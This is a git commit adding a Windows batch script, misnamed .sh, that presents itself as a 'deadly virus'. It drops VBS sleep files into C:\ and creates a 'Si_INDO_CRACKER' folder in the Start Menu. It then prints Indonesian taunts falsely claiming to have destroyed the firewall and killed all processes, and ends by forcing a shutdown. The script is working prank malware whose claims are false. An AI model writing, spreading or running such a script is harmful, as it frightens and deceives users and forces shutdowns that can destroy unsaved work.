7280cf8aa4e9996eca8e00303915a16f98d6989e
HKTeamTools <48935525+HKTeamTools@users.noreply.github.com>
2019-07-02 13:20:06 +0700

    Add files via upload

---
+++ Tantegirang.sh
@@ -0,0 +1,88 @@
+cls
+:A
+color 0a
+cls
+@echo off
+echo Wscript.Sleep 5000>C:\sleep5000.vbs
+echo Wscript.Sleep 3000>C:\sleep3000.vbs
+echo Wscript.Sleep 4000>C:\sleep4000.vbs
+echo Wscript.Sleep 2000>C:\sleep2000.vbs
+cd %systemroot%\System32
+dir
+cls
+start /w wscript.exe C:\sleep3000.vbs
+echo BANGUN TIDUR KU TERUS MENGHANCURKAN SYSTEM…^__^
+echo …………………
+echo:
+echo:
+start /w wscript.exe C:\sleep3000.vbs
+echo NEXT…………!
+echo:
+echo:
+echo HALO SOBAT
+echo MAU JADI TEMAN AKU ??
+echo:
+echo:
+echo I'M JOU VIRUS!!!
+start /w wscript.exe C:\sleep2000.vbs
+echo …………
+start /w wscript.exe C:\sleep4000.vbs
+echo …………
+echo NTAR…….!
+start /w wscript.exe C:\sleep2000.vbs
+echo:
+echo:
+echo:
+echo VIRUS INI ADALAH VIRUS YANG SANGAT MEMATIKAN…
+cd C:\Documents and Settings\All Users\Start Menu\Programs\
+mkdir Si_INDO_CRACKER
+start /w wscript.exe C:\sleep3000.vbs
+echo:
+echo:
+echo:
+echo:
+echo HAPPY BIRTHDAY
+echo KOMPUTER KAMU BAGUS DEH
+echo BOLEH Q INTIP DIKIT
+echo HMM BOLEH JUGA NEH ISINYA
+echo CALL ME YACHH +6284323xxxxxx GPRS JUGA BOLEH KOK
+echo:
+echo:
+echo:
+echo:
+echo:
+echo SABARAN BRO…
+start /w wscript.exe C:\sleep3000.vbs
+echo ………..
+echo zzzzzzz….
+echo:
+echo:
+start /w wscript.exe C:\sleep3000.vbs
+echo OKE….Virus AKTIF!
+echo:
+echo:
+echo:
+start /w wscript.exe C:\sleep2000.vbs
+echo FIREWALL KAMU ANCUR…
+start /w wscript.exe C:\sleep2000.vbs
+echo SEMUA PROSESS UDAH DIBANTAI…
+start /w wscript.exe C:\sleep2000.vbs
+echo DENGAN SEGALA HORMAT VIRUS BOOTING DULU…
+start /w wscript.exe C:\sleep2000.vbs
+echo:
+echo:
+echo:
+echo VIRUS MASUK PODIUM AKHIR!
+start /w wscript.exe C:\sleep2000.vbs
+echo:
+echo:
+echo I LOVE U FULL
+echo HA HA HA HA
+echo:
+echo:
+echo:
+echo:
+start /w wscript.exe C:\sleep2000.vbs
+pause
+shutdown -f -s -c “BERTAUBATLAH, BACK TO UR GOD MOHON MAAF LAHIR DAN BATIN
+WASSALUMUALAIKUM WR WB.”
